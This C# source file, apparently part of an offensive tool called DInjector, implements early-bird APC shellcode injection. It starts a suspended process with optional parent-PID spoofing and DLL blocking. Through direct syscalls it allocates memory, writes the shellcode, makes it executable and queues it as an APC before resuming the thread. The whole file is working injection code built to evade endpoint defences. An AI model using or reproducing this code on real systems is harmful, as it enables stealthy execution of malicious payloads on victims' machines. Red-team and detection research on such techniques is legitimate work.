using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadAPC
    {
        public static void Execute(byte[] shellcode, string processImage, int ppid = 0, bool blockDlls = false)
        {
            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = Syscalls.NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtWriteVirtualMemory: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            uint oldProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtOpenThread

            IntPtr hThread = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueThread = (IntPtr)pi.dwThreadId };

            ntstatus = Syscalls.NtOpenThread(
                ref hThread,
                DI.Data.Win32.Kernel32.ThreadAccess.SetContext,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtOpenThread");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtOpenThread: {ntstatus}");

            #endregion

            #region NtQueueApcThread

            ntstatus = Syscalls.NtQueueApcThread(
                hThread,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtQueueApcThread");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtQueueApcThread: {ntstatus}");

            #endregion

            #region NtAlertResumeThread
            
            uint suspendCount = 0;

            ntstatus = Syscalls.NtAlertResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");

            #endregion

            Win32.CloseHandle(hThread);
            Win32.CloseHandle(hProcess);
        }
    }
}
